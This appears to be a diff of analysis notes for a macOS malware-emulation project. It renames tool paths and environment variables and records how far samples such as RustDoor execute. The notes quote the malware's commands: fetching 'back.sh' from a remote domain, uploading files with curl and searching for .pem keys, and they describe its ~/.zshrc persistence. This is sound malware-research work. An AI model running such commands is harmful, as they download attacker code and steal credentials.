@@ -8,7 +8,7 @@ emulator behavior.
 - Path: [fixtures/macos/bin/arm64_hello](D:/dev/quiling/qiling/fixtures/macos/bin/arm64_hello)
 - Role: smoke-test fixture
 - Expected status: should execute successfully
-- Current note: used as the primary quick validation sample for `cargo build --bin machina` and basic runtime checks; on Darwin hosts, compat mode proxies the no-dyld arm64 `_puts`, `_printf`, and `_putchar` imports through host libc, proxies `_open`/`_read`/`_write`/`_close` through host libc fd calls, and handles `_dlopen`/`_dlsym` by returning synthetic guest arm64 trampoline stubs instead of raw host pointers. The Intel macOS compat integration test now also compiles a fresh arm64 C program that calls `printf(...)`, `dlsym("printf")` followed by the returned guest trampoline, and `write(1, ...)`, so CI proves observable guest behavior from both the checked-in fixture (`Hello World`) and a newly built binary.
+- Current note: used as the primary quick validation sample for `cargo build -p machoscope --bin machoscope` and basic runtime checks; on Darwin hosts, compat mode proxies the no-dyld arm64 `_puts`, `_printf`, and `_putchar` imports through host libc, proxies `_open`/`_read`/`_write`/`_close` through host libc fd calls, and handles `_dlopen`/`_dlsym` by returning synthetic guest arm64 trampoline stubs instead of raw host pointers. The Intel macOS compat integration test now also compiles a fresh arm64 C program that calls `printf(...)`, `dlsym("printf")` followed by the returned guest trampoline, and `write(1, ...)`, so CI proves observable guest behavior from both the checked-in fixture (`Hello World`) and a newly built binary.
 
 ## `2d0dda75bfc90e7ffda72640eb32c7ff9f51c90c30f4a6d1e05df93e58848f36.macho`
 
@@ -62,23 +62,23 @@ emulator behavior.
     - `_stat /Users/analyst/.docks/.inj_rc_chr` → `ENOENT` (Chrome rc-injection marker)
     - `_stat /Users/analyst/.docks/.inj_launch_chr` → `ENOENT` (Chrome launch-injection marker)
   - daemon child PID=3 now runs all the way through its persistence path and reaches the **first malware-interesting `posix_spawnp`** from the article:
-    - opens `~/.zshrc`, reads it in 32→2048-byte windows, then re-opens it `read_write` and writes injected lines for shell-startup persistence (the literal payload — initially `\n\n`, more after the spawn returns — is dumped to `target/machina-captures/file_pid<pid>_fd<fd>_<sanitized>.bin`)
+    - opens `~/.zshrc`, reads it in 32→2048-byte windows, then re-opens it `read_write` and writes injected lines for shell-startup persistence (the literal payload — initially `\n\n`, more after the spawn returns — is dumped to `target/compatra-captures/file_pid<pid>_fd<fd>_<sanitized>.bin`)
     - opens `~/.docks/cron` and `/tmp/com.apple.lock.<timestamp>` for cron-style and lock persistence
     - `_stat`s the `~/.local` and `~/.zshrc` parents during persistence prep
     - then `posix_spawnp("log", ["log", "stream", "--predicate", "eventMessage contains \"com.apple.restartInitiated\" or eventMessage contains \"com.apple.shutdownInitiated\"", "--info"])` — exactly the shutdown-monitor command from Unit42's Table 1
   - the per-instance `/tmp/com.apple.lock.<timestamp>` marker now reports `ENOENT` like the bare `/tmp/com.apple.lock`, so the daemon doesn't conclude "another instance already installed me" and exit early; combined with `O_CREAT` honoring (see below) it actually creates the lock and proceeds to spawn the log-stream watcher.
   - the open path now honors `O_CREAT` (Darwin `0x200`) for paths the materialization policy normally suppresses. Without that, the malware's "open RDONLY → ENOENT, retry as `O_RDWR|O_CREAT|O_TRUNC`" lock-creation pattern looped back to `ENOENT` on the second open and the daemon panicked instead of moving past the lock check.
-  - file writes to synthetic guest fds are now appended to `target/machina-captures/file_pid<pid>_fd<fd>_<sanitized_path>.bin`, configurable via `MACHINA_PAYLOAD_DUMP_DIR`, so analysts can inspect the actual payload bytes (e.g. the `~/.zshrc` injection) instead of just a 128-byte preview.
+  - file writes to synthetic guest fds are now appended to `target/compatra-captures/file_pid<pid>_fd<fd>_<sanitized_path>.bin`, configurable via `COMPATRA_PAYLOAD_DUMP_DIR`, so analysts can inspect the actual payload bytes (e.g. the `~/.zshrc` injection) instead of just a 128-byte preview.
   - the immediate post-daemon blocker observed under the legacy 10M-instruction budget was `instruction_budget_exhausted` deep inside the parent's Rust `OnceLock`/init trampoline at the `cas64` → `blr` pattern around `0x100182424` / `0x10018242C`; with the SWP/`_exit`/`done_addr` fixes that path now completes well within the default profile
   - the worker-thread `brk #0x1` at `0x10000AE00` is no longer reachable: the panic was caused by `_fcntl(kq, F_DUPFD_CLOEXEC, _)` returning `-1` because `duplicate_synthetic_fd` only consults `process_fd_targets` and kqueue fds live in `os.kqueues`. The fcntl hook now detects kqueue fds, clones the kevent registration set into a fresh kqueue fd, and clamps the bogus stack-pointer-shaped min-fd argument that mio leaks through inlined helpers. After this, the worker bootstraps Tokio's macOS event loop the same way real Tokio does: `_kqueue` → 131072, `_fcntl(kq, F_SETFD, _)`, `_fcntl(kq, F_DUPFD_CLOEXEC, _)` → 131073, EVFILT_USER waker registration via `_kevent(ident=0, filter=-10, flags=EV_ADD|EV_CLEAR|EV_RECEIPT)`, `_fcntl(kq, F_DUPFD_CLOEXEC, 1)` → 131074.
   - synthetic kqueue now honors EV_RECEIPT registration acknowledgements and EVFILT_USER `NOTE_TRIGGER` wakeups. A triggered EVFILT_USER registration can be returned through the guest `eventlist`, and `EV_CLEAR` registrations reset after delivery; the pipe-read readiness path remains covered by the same helper logic.
   - **current next blocker:** after the worker bootstraps its kqueue + EVFILT_USER waker, the daemon TID=3 reads 320 bytes from the log-stream pipe (the synthetic `restartInitiated` / `shutdownInitiated` log entries fed in by `posix_spawnp`), then both threads block waiting for further async events. The remaining instruction budget is consumed by the parent process spinning in a `OnceLock`/atomic-load loop at `0x100100728` (function `sub_1001006FC`, an `atomic_load_explicit(&qword_10026D408, memory_order_acquire) != 3` re-check). To reach the rest of Unit42's Table-1 commands (`chflags hidden npm`, `chmod +x npm`, `zsh -c zip -r ...`, `zsh -c curl -F file=...`, `zsh -c curl -O https://apple-ads-metric.com/back.sh`, `zsh -c mdfind -name .pem`) we still need to drive the C2 command loop or add a synthetic producer that actually triggers the registered user/event-loop wakeups after log-stream or network data is made available.
 - Important implication:
   - the in-process bootstrap/runtime/daemonization compatibility blockers are resolved and the emulator now reaches the first article-listed `posix_spawnp` command (`log stream --predicate ... restartInitiated/shutdownInitiated --info`)
-  - Tokio's macOS worker bootstrap (kqueue + EVFILT_USER waker + duplicates) now completes successfully, no more `brk #0x1` on TID=4 — pinned by the `tests/rustdoor_fast_mode.rs` integration test; the lower-level EVFILT_USER receipt/trigger state machine is covered by unit tests in `crates/machina-runtime/src/macos/arch_arm64/io_imports.rs`
+  - Tokio's macOS worker bootstrap (kqueue + EVFILT_USER waker + duplicates) now completes successfully, no more `brk #0x1` on TID=4 — pinned by the `crates/machoscope/tests/rustdoor_fast_mode.rs` integration test; the lower-level EVFILT_USER receipt/trigger state machine is covered by unit tests in `crates/compatra-runtime/src/macos/arch_arm64/io_imports.rs`
   - the next compatibility work for this family is making Tokio's poll loop emit synthetic events for the C2 HTTP requests / log-stream pipe, so the malware progresses past its async wait and into the remaining `posix_spawnp` calls (chflags / chmod / curl / zip / mdfind / reverse-shell)
 - Recommended local invocation:
-  - `MACHINA_PROFILE=long .\target\debug\machina.exe fixtures\macos\bin\rustdoor\76f96a35b6f638eed779dc127f29a5b537ffc3bb7accc2c9bfab5a2120ea6bc9.macho > rustdoor-trace-long.jsonl`
+  - `COMPATRA_PROFILE=long .\target\debug\machoscope.exe fixtures\macos\bin\rustdoor\76f96a35b6f638eed779dc127f29a5b537ffc3bb7accc2c9bfab5a2120ea6bc9.macho > rustdoor-trace-long.jsonl`
 
 ## `machoman/D1yCPUyk.bin.macho`
 
@@ -105,7 +105,7 @@ emulator behavior.
     vtable placeholders, VTT placeholders, and `ctype<char>::id`).
     Chained fixups prefer these data-symbol bindings over function
     stubs so data loads do not interpret stub bytes as objects.
-  - `crates/machina-runtime/src/macos/analysis_arm64/cpp_imports.rs` now covers the libc++
+  - `crates/compatra-runtime/src/macos/analysis_arm64/cpp_imports.rs` now covers the libc++
     surface this sample exercises with standard hooks rather than
     sample-local object layouts: string init/copy/destroy,
     `assign`, `compare`, `find`/`rfind`, `append`, `erase`,
@@ -166,15 +166,15 @@ emulator behavior.
   tail-jumping to `_main`. The two C++ initializers register
   `___cxa_atexit` handlers via `_dladdr`, then control
   reaches `_main` with `argc/argv/envp` preserved.
-- `MACHINA_TRACE_FN_ENTRY=<label>:<hex addr>,...` installs
+- `COMPATRA_TRACE_FN_ENTRY=<label>:<hex addr>,...` installs
   no-op code hooks at the given addresses and emits a
   `function-entry` JSONL event whenever execution reaches
   one. Used to pin down which paths the binary actually visits.
 - Recommended local invocation:
-  - `.\target\debug\machina.exe fixtures\macos\bin\machoman\D1yCPUyk.bin.macho > machoman-trace.jsonl`
+  - `.\target\debug\machoscope.exe fixtures\macos\bin\machoman\D1yCPUyk.bin.macho > machoman-trace.jsonl`
   - PowerShell validation for the profiler path:
-    `$env:MACHINA_TRACE_FORMAT="jsonl"; $env:MACHINA_BYPASS_USAGE_CHECK="0x10022AE68@0x10022812C=1,0;0x10022AE68@0x100225548=0;0x10022AE68@0x100225ADC=0"; $env:MACHINA_ARGV_APPEND="http://127.0.0.1:8888"; .\target\debug\machina.exe fixtures\macos\bin\machoman\D1yCPUyk.bin.macho > machoman-bypass.jsonl`
-  - `MACHINA_BYPASS_USAGE_CHECK` accepts an optional LR filter
+    `$env:COMPATRA_TRACE_FORMAT="jsonl"; $env:COMPATRA_BYPASS_USAGE_CHECK="0x10022AE68@0x10022812C=1,0;0x10022AE68@0x100225548=0;0x10022AE68@0x100225ADC=0"; $env:COMPATRA_ARGV_APPEND="http://127.0.0.1:8888"; .\target\debug\machoscope.exe fixtures\macos\bin\machoman\D1yCPUyk.bin.macho > machoman-bypass.jsonl`
+  - `COMPATRA_BYPASS_USAGE_CHECK` accepts an optional LR filter
     (`0xADDR@0xLR=...`) and a comma-separated list of per-call return
     values. This keeps the first usage decision patched without
     forcing later calls through the same obfuscated helper to return
